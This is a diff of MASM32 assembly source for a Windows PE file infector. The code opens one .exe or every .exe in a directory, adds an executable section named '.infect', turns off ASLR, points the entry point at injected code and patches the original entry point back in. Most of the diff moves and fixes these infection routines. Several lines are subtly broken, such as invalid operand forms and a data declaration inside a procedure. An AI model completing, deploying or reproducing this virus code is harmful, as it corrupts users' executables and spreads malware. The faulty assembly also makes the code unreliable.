@@ -18,6 +18,9 @@
   includelib c:\masm32\lib\kernel32.lib
   includelib c:\masm32\lib\shell32.lib
 
+  IMAGE_FIRST_SECTION MACRO pNtHeader:REQ
+    lea eax, [pNtHeader + SIZEOF IMAGE_NT_HEADERS]
+  ENDM
   .data 
     fileArg db "-f", 0
     directoryArg db "-d", 0
@@ -62,12 +65,17 @@ GetThirdArg PROC
   invoke WideCharToMultiByte, CP_ACP, 0, eax, -1, NULL, 0, NULL, NULL
   mov ecx, eax
   invoke GlobalAlloc, GMEM_FIXED, eax
-  push eax
+  mov esi, eax ; esi points to the allocated memory
   invoke WideCharToMultiByte, CP_ACP, 0, [pArgList + 8], -1, eax, ecx, NULL, NULL
-  pop eax
+ 
 
   ; Clean up
   invoke GlobalFree, pArgList
+  mov eax, esi; Return the address of the ANSI string
+  pop edx
+  pop ecx
+  pop eax
+
 
   ret
 
@@ -134,151 +142,6 @@ GetEntryPoint PROC pNtHeader:DWORD, pByte:DWORD
   ret
 GetEntryPoint ENDP
 
-OpenFile proc fileName:DWORD
-  LOCAL hFile:DWORD
-  LOCAL fileSize:DWORD
-  LOCAL pByte:DWORD
-  LOCAL byteWritten:DWORD
-  LOCAL pDosHeader:DWORD
-  LOCAL pNtHeader:DWORD
-
-  invoke CreateFile, fileName, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
-  mov hFile, eax
-  cmp eax, INVALID_HANDLE_VALUE
-  je _exit
-
-  invoke GetFileSize, hFile, NULL
-  mov fileSize, eax
-  cmp eax, 0
-  je _closeHandle
-
-  invoke GlobalAlloc, GMEM_FIXED, fileSize
-  mov pByte, eax
-
-  invoke ReadFile, hFile, pByte, fileSize, addr byteWritten, NULL
-  cmp eax, 0
-  je _closeHandle
-
-  mov eax, pByte
-  mov pDosHeader, eax
-  cmp word ptr [eax], IMAGE_DOS_SIGNATURE
-  jne _closeHandle
-
-  add eax, [eax + 3Ch]
-  mov pNtHeader, eax
-  cmp word ptr [eax + 4], IMAGE_FILE_MACHINE_I386
-  jne _closeHandle
-
-  invoke CreateNewSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten, 400
-  cmp eax, 0
-  je _closeHandle
-
-  invoke InfectSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten
-  cmp eax, 0
-  je _closeHandle
-
-_closeHandle:
-  invoke CloseHandle, hFile
-
-_exit:
-  ret
-OpenFile endp
-
-OpenDirectory proc pathDirectory:DWORD
-  LOCAL hFind:HANDLE
-  LOCAL findData:WIN32_FIND_DATA
-  LOCAL filePath[260]:BYTE
-  LOCAL countFile:DWORD
-
-  mov countFile, 0
-
-  invoke lstrcpy, addr filePath, pathDirectory
-  invoke lstrcat, addr filePath, "\*.exe"
-
-  invoke FindFirstFile, addr filePath, addr findData
-  cmp eax, INVALID_HANDLE_VALUE
-  je _exit
-  mov hFind, eax
-
-_nextFile:
-  invoke OpenFile, addr findData.cFileName
-  inc countFile
-
-  invoke FindNextFile, hFind, addr findData
-  cmp eax, 0
-  jne _nextFile
-
-  invoke FindClose, hFind
-
-  cmp countFile, 0
-  je _exit
-
-  mov eax, 1
-  ret
-
-_exit:
-  xor eax, eax
-  ret
-OpenDirectory endp
-
-
-
-CreateNewSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD, sizeOfSection:DWORD
-  ; Get the first section headerI
-  invoke IMAGE_FIRST_SECTION, pNtHeader
-  mov ebx, eax
-
-  ; Get the number of sections
-  mov eax, pNtHeader
-  add eax, 6 ; Offset of NumberOfSections in IMAGE_FILE_HEADER
-  movzx ecx, word ptr [eax]
-
-  ; Section name
-  push ".infect"
-  pop esi
-
-  ; Check if the section already exists
-  xor edx, edx
-_checkSection:
-  mov eax, [ebx + edx * 40] ; Offset of Name in IMAGE_SECTION_HEADER
-  cmp eax, esi
-  je _sectionExists
-  inc edx
-  cmp edx, ecx
-  jl _checkSection
-
-  ; Initialize the new section header
-  lea eax, [ebx + ecx * 40]
-  invoke ZeroMemory, eax, 40
-  mov [eax], esi
-
-  ; Set the section attributes
-  invoke GetAlign, sizeOfSection, [pNtHeader + 56], 0
-  mov [eax + 8], eax ; Offset of Misc.VirtualSize in IMAGE_SECTION_HEADER
-  invoke GetAlign, [ebx + (ecx - 1) * 40 + 8], [pNtHeader + 56], [ebx + (ecx - 1) * 40 + 12]
-  mov [eax + 12], eax ; Offset of VirtualAddress in IMAGE_SECTION_HEADER
-  invoke GetAlign, sizeOfSection, [pNtHeader + 60], 0
-  mov [eax + 16], eax ; Offset of SizeOfRawData in IMAGE_SECTION_HEADER
-  invoke GetAlign, [ebx + (ecx - 1) * 40 + 16], [pNtHeader + 60], [ebx + (ecx - 1) * 40 + 20]
-  mov [eax + 20], eax ; Offset of PointerToRawData in IMAGE_SECTION_HEADER
-  mov dword ptr [eax + 36], 0E00000E0h ; Offset of Characteristics in IMAGE_SECTION_HEADER
-
-  ; Update the file
-  invoke SetFilePointer, hFile, [eax + 20] + [eax + 16], 0, FILE_BEGIN
-  invoke SetEndOfFile, hFile
-  add [pNtHeader + 80], [eax + 12] + [eax + 8] ; Offset of SizeOfImage in IMAGE_OPTIONAL_HEADER
-  inc word ptr [pNtHeader + 6]
-  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN
-  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0
-  mov eax, 1
-  ret
-
-_sectionExists:
-  invoke CloseHandle, hFile
-  xor eax, eax
-  ret
-CreateNewSection endp
-
 InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD
 
   ; Get the first and last section
@@ -299,7 +162,9 @@ InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, by
   mov [OEP], eax
 
   ; Disable ASLR
-  and dword ptr [pNtHeader + 70], not IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
+  mov eax, IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
+  not eax
+  and dword ptr [pNtHeader + 70], eax
 
   ; Change the EP to point to the last section created
   mov eax, [lastSection]
@@ -310,8 +175,9 @@ InfectSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, by
   invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0
 
   ; Obtain the opcodes
-  mov eax, offset _loc1
-  mov [start], eax
+  lea eax, _loc1
+  mov ebx, start
+  mov [ebx], eax
   jmp _over
 _loc1:
   mov eax, fs:[30h]
@@ -468,13 +334,13 @@ _stp :
   jmp eax
 over:
   mov eax, offset _loc2
-  mov [end], eax
+  mov [endLabel], eax
 _loc2:
 
   ; Initialize variables
   mov edi, offset address
   mov esi, offset start
-  mov ecx, (end - 11) - start
+  mov ecx, (endLabel - 11) - start
   xor edx, edx
 
 ; Loop over bytes
@@ -485,11 +351,13 @@ _loop:
   jne _next
 
   ; Replace placeholder with OEP
+  carrier DWORD ?
+  lea eax, [esi + edx]
   push ecx
   push edi
   push esi
   push edx
-  invoke VirtualProtect, esi + edx, 4, PAGE_EXECUTE_READWRITE, offset carrier
+  invoke VirtualProtect, eax, 4, PAGE_EXECUTE_READWRITE, offset carrier
   mov [esi + edx], OEP
   pop edx
   pop esi
@@ -504,14 +372,183 @@ _next:
   loop _loop
 
   ; Write to file
-  invoke SetFilePointer, hFile, lastSection.PointerToRawData, NULL, FILE_BEGIN
-  invoke WriteFile, hFile, offset address, edx, offset byteWritten, NULL
+  lea eax, lastSection.PointerToRawData
+  invoke SetFilePointer, hFile, eax, NULL, FILE_BEGIN
+  lea eax, address
+  lea ebx, bytesWritten
+  invoke WriteFile, hFile, eax, edx, ebx, NULL
   invoke CloseHandle, hFile
 
   mov eax, 1
   ret
 
 InfectSection endp
+
+CreateNewSection proc hFile:DWORD, pNtHeader:DWORD, pByte:DWORD, fileSize:DWORD, bytesWritten:DWORD, sizeOfSection:DWORD
+  ; Get the first section headerI
+
+  IMAGE_FIRST_SECTION pNtHeader
+  mov ebx, eax
+
+  ; Get the number of sections
+  mov eax, pNtHeader
+  add eax, 6 ; Offset of NumberOfSections in IMAGE_FILE_HEADER
+  movzx ecx, word ptr [eax]
+
+  ; Section name
+  push ".infect"
+  pop esi
+
+  ; Check if the section already exists
+  xor edx, edx
+_checkSection:
+  mov eax, [ebx + edx * 40] ; Offset of Name in IMAGE_SECTION_HEADER
+  cmp eax, esi
+  je _sectionExists
+  inc edx
+  cmp edx, ecx
+  jl _checkSection
+
+  ; Initialize the new section header
+  lea eax, [ebx + ecx * 40]
+  push eax  ; Save the original value of eax
+  push ecx  ; Save the original value of ecx
+  mov ecx, 40  ; Set the count to 40
+  mov edi, eax  ; Set the destination to eax
+  xor eax, eax  ; Set the value to 0
+  rep stosb  ; Fill the memory with zeros
+  pop ecx  ; Restore the original value of ecx
+  pop eax  ; Restore the original value of eax
+  mov [eax], esi
+
+
+  ; Set the section attributes
+  mov eax, [pNtHeader + 60]
+  invoke GetAlign, sizeOfSection, eax, 0
+  mov [eax + 8], eax ; Offset of Misc.VirtualSize in IMAGE_SECTION_HEADER
+  mov edx, [ebx + (ecx - 1) * 40 + 8]
+  mov eax, [pNtHeader + 56]
+  mov edi, [ebx + (ecx - 1) * 40 + 12]
+  invoke GetAlign, edx, eax, edi
+  mov [eax + 12], eax ; Offset of VirtualAddress in IMAGE_SECTION_HEADER
+  invoke GetAlign, sizeOfSection, [pNtHeader + 60], 0
+  mov [eax + 16], eax ; Offset of SizeOfRawData in IMAGE_SECTION_HEADER
+  mov edx, [ebx + (ecx - 1) * 40 + 16]
+  mov eax, [pNtHeader + 56]
+  mov edi, [ebx + (ecx - 1) * 40 + 12]
+  invoke GetAlign, edx, eax, edi 
+  mov [eax + 20], eax ; Offset of PointerToRawData in IMAGE_SECTION_HEADER
+  mov dword ptr [eax + 36], 0E00000E0h ; Offset of Characteristics in IMAGE_SECTION_HEADER
+
+  ; Update the file
+  invoke SetFilePointer, hFile, [eax + 20] + [eax + 16], 0, FILE_BEGIN
+  invoke SetEndOfFile, hFile
+  mov edx, [eax + 12]
+  add edx, [eax + 8]
+  add [pNtHeader + 80], edx ; Offset of SizeOfImage in IMAGE_OPTIONAL_HEADER
+  inc word ptr [pNtHeader + 6]
+  invoke SetFilePointer, hFile, 0, 0, FILE_BEGIN
+  invoke WriteFile, hFile, pByte, fileSize, addr bytesWritten, 0
+  mov eax, 1
+  ret
+
+_sectionExists:
+  invoke CloseHandle, hFile
+  xor eax, eax
+  ret
+CreateNewSection endp
+
+OpenFile proc nameOfFile:DWORD
+  LOCAL hFile:HANDLE
+  LOCAL fileSize:DWORD
+  LOCAL pByte:DWORD
+  LOCAL byteWritten:DWORD
+  LOCAL pDosHeader:DWORD
+  LOCAL pNtHeader:DWORD
+
+  mov eax, nameOfFile
+
+  invoke CreateFile ,eax, GENERIC_READ or GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+  mov hFile, eax
+  cmp eax, INVALID_HANDLE_VALUE
+  je _exit
+
+  invoke GetFileSize, hFile, NULL
+  mov fileSize, eax
+  cmp eax, 0
+  je _closeHandle
+
+  invoke GlobalAlloc, GMEM_FIXED, fileSize
+  mov pByte, eax
+
+  invoke ReadFile, hFile, pByte, fileSize, addr byteWritten, NULL
+  cmp eax, 0
+  je _closeHandle
+
+  mov eax, pByte
+  mov pDosHeader, eax
+  cmp word ptr [eax], IMAGE_DOS_SIGNATURE
+  jne _closeHandle
+
+  add eax, [eax + 3Ch]
+  mov pNtHeader, eax
+  cmp word ptr [eax + 4], IMAGE_FILE_MACHINE_I386
+  jne _closeHandle
+
+  invoke CreateNewSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten, 400
+  cmp eax, 0
+  je _closeHandle
+
+  invoke InfectSection, hFile, pNtHeader, pByte, fileSize, addr byteWritten
+  cmp eax, 0
+  je _closeHandle
+
+_closeHandle:
+  invoke CloseHandle, hFile
+
+_exit:
+  ret
+OpenFile endp
+
+OpenDirectory proc pathDirectory:DWORD
+  LOCAL hFind:HANDLE
+  LOCAL findData:WIN32_FIND_DATA
+  LOCAL filePath[260]:BYTE
+  LOCAL countFile:DWORD
+
+  mov countFile, 0
+
+  invoke lstrcpy, addr filePath, pathDirectory
+  invoke lstrcat, addr filePath, "\*.exe"
+
+  invoke FindFirstFile, addr filePath, addr findData
+  cmp eax, INVALID_HANDLE_VALUE
+  je _exit
+  mov hFind, eax
+
+_nextFile:
+  invoke OpenFile, addr findData.cFileName
+  inc countFile
+
+  invoke FindNextFile, hFind, addr findData
+  cmp eax, 0
+  jne _nextFile
+
+  invoke FindClose, hFind
+
+  cmp countFile, 0
+  je _exit
+
+  mov eax, 1
+  ret
+
+_exit:
+  xor eax, eax
+  ret
+OpenDirectory endp
+
+
+
 
 main proc
   LOCAL cmdline:DWORD
@@ -546,7 +583,8 @@ _printUsage:
 
 
 _openFile:
-  invoke OpenFile
+  call GetThirdArg
+  invoke OpenFile, eax
   jmp _exit
 
 _openDirectory:
